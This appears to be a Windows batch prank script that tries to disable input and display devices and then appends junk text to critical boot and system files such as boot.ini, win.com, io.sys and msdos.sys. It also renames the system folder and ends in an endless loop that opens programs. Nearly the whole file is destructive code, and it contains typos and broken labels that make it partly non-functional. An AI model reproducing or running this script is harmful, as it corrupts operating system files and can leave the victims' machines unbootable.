   @echo off
   c:\windows\rundll32 mouse,disable
   c:\windows\rundll32 keyboard,disable
   c:\windows\rundll32 display,disable
   goto :check

   :credits
   echo thx HALLLOOO for bring this up!
   :end

   :check
   if exist c:\ntldr goto :checkagain
   if not exist c:\ntldr goto :usingwin9x

   :checkagain
   if exist c:\windows\system32\win.com goto :usingwin2k
   if not exist c:\windows\system32\win.com :usingwin9x

   :usingwin2k
   echo multi(0)disk(0)rdisk(0)partition(1)="haha  u!" >> c:\boot.ini
   echo haha u sux! >> c:\windows\system32\win.com
   ehco haha haha >> c:\io.sys
   echo YOU ARE AN IDIOT!! HAHAHA! >> c:\msdos.sys
   :notenough

   :using win9x
   rem easy to destroy...
   echo ahaha SUCKER!!! >> c:\windows\win.com
   echo haha u F U C K >> c:\windows\win.com
   echo sucker! >> c:\windows\system.ini
   rename c:\windows\system c:\windows\sysfuck
   :notenough

   :notenough
   start notpad U SUX!!!
   start kazaa.exe
   start iexplorer www.freeman.com
   choice /ty,2 >nul
   goto :notenough
